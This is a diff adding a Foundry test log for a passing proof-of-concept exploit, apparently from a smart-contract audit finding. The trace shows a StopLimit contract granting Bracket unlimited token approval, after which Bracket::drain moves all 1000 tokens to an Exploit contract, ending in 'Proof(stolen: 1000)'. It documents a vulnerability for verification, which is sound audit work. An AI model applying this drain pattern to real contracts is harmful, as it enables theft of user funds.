@@ -1,0 +1,47 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/44375-h-5-attacker-can-drain-stoplimit-contract-funds-through-brac_exp.sol:PoC_44375
+[PASS] test_exploit() (gas: 1869564)
+Traces:
+  [1889464] PoC_44375::test_exploit()
+    ├─ [1068705] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 5338 bytes of code
+    ├─ [786769] Exploit::run()
+    │   ├─ [330566] → new Token@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1651 bytes of code
+    │   ├─ [176558] → new Bracket@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 769 bytes of code
+    │   ├─ [128392] → new StopLimit@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   ├─ [23039] Token::mint(StopLimit: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xdc168c35dff6d4bc573a93840ae1ecb3ee12fd9d64a52f0b58cdf0e7d3f24462: 0 → 1000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [22886] Token::approve(Bracket: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x84cc945667f62ad92941c11a2d11ac838c5f6768b004a52e076fe3392cae930a: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 291 bytes of code
+    │   ├─ [25627] Bracket::drain(StopLimit: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000)
+    │   │   ├─ [24066] Token::transferFrom(StopLimit: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 1000
+    │   │   │   │   @ 0xdc168c35dff6d4bc573a93840ae1ecb3ee12fd9d64a52f0b58cdf0e7d3f24462: 1000 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [845] Token::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000
+    │   ├─ [845] Token::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000
+    │   ├─ emit Proof(stolen: 1000)
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 675.42µs (388.75µs CPU time)
+
+Ran 1 test suite in 5.28ms (675.42µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
